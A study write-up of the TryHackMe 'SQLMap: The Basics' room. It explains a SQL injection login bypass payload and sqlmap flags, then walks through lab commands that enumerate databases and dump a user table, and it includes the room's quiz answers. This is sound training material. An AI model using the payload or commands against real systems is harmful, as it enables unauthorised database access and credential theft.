---
{"dg-publish":true,"permalink":"/try-hack-me/rooms/sqlmap-the-basics/","created":"2024-11-04T19:56:39.272-05:00","updated":"2025-03-11T00:32:59.401-04:00"}
---

# Task 2 - SQL Injection Vulnerability

- Usual SQL query from user to data base is sent like so,
	- `SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';`
	- Needs both username and password to be correct in order to go through
- If user input not validated/sanitized, attackers can input direct SQL queries that get executed in the database
- They can type in the following fields for the example above
	- Username: John
	- Password: abc' OR 1=1;-- -
	- The SQL query now becomes:
		- `SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';`
		- The OR condition here with the 1=1 statement makes the whole query true, regardless of the password being inputted (abc)
		- "-- -" at the end comments out anything after the 1=1, allowing the query to get executed right away
		- Ensure to use single quotes to make the last part separate instead of one whole string  

> [!Question]
> **Which boolean operator checks if at least one side of the operator is true for the condition to be true?** 

> [!Success] Answer
> OR

> [!Question]
> **Is 1=1 in an SQL query always true? (YEA/NAY)** 

> [!Success] Answer
> Answer: YEA
# Task 3 - Automated SQL Injection Tool

| Flag     | Description                                                                                  |
| -------- | -------------------------------------------------------------------------------------------- |
| --wizard | Guides you through each step to ask questions in order to finish scan, perfect for beginners |
| --dbs    | Extract all databases names                                                                  |
| -D       | Used to extract information about tables from set database, D database_name --tables         |
| --dump   | Extracts records from tables                                                                 |
| -u       | Used to provide URL                                                                          |
| --tables | Extracts all tables                                                                          |

- HTTP Get-based testing    
	- Look for vulnerable URL/requests, mainly those with GET parameters
	- Vulnerable to SQL injection
- Can also do POST-based testing    
	- Need to intercept POST request with -r
	- Can save to text file
	- Example, `sqlmap -r intercepted_request.txt` 

> [!Question]
> **Which flag in the SQLMap tool is used to extract all the databases available?** 

> [!Success] Answer
> --dbs

> [!Question]
> **What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)** 

> [!Success] Answer
> `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables`
   
# Task 4 - Practical Exercise

  If the page URL is not showing the GET parameters, can inspect page source and go to the Network section to find all requests
  
![The in-browser tools in the website that allow us to see the URL with parameters.|1000](/img/user/TryHackMe/THM_Images/749c11b0d8fccaea899c4902ee4732e4.png)

> [!Question]
> **How many databases are available in this web application?** 

Went to website and tried a random request to spawn the GET record, got to see the HTTP Get request link, [http://10.10.245.244/ai/includes/user_login?email=test&password=test](http://10.10.245.244/ai/includes/user_login?email=test&password=test)

![Exported image|1000](/img/user/TryHackMe/THM_Images/f80555465be20f0c39aae7a62681d668.png)  

Ran the command,

```
sqlmap -u http://10.10.245.244/ai/includes/user_login?email=test&password=test --dbs --level=5. 
```

Said Y,Y,Y,N for the parameters regarding level 5

![Exported image](/img/user/TryHackMe/THM_Images/358d32e53559d823854b64a926ed3c9b.png)  

![Exported image](/img/user/TryHackMe/THM_Images/77110f8198e789535e6ea6b75f08a6a3.png)  

> [!Success] Answer
> 6

> [!Question]
> **What is the name of the table available in the "ai" database?** 

Ran the command, 

```
sqlmap -u 'http://10.10.245.244/ai/includes/user_login?email=test&password=test -D ai --tables
```

![Exported image](/img/user/TryHackMe/THM_Images/c0ae81e31bcc2e146548e8075da07205.png)  

> [!Success] Answer
> user

> [!Question]
> **What is the password of the email test@chatai.com?** 

Ran the command, 

```
sqlmap -u http://10.10.245.244/ai/includes/user_login?email=test&password=test -D ai --tables --dump
```

![Exported image](/img/user/TryHackMe/THM_Images/e160f2cd554b2bc6b85e3255cd6983d0.png)  

> [!Success] Answer
> 12345678
          

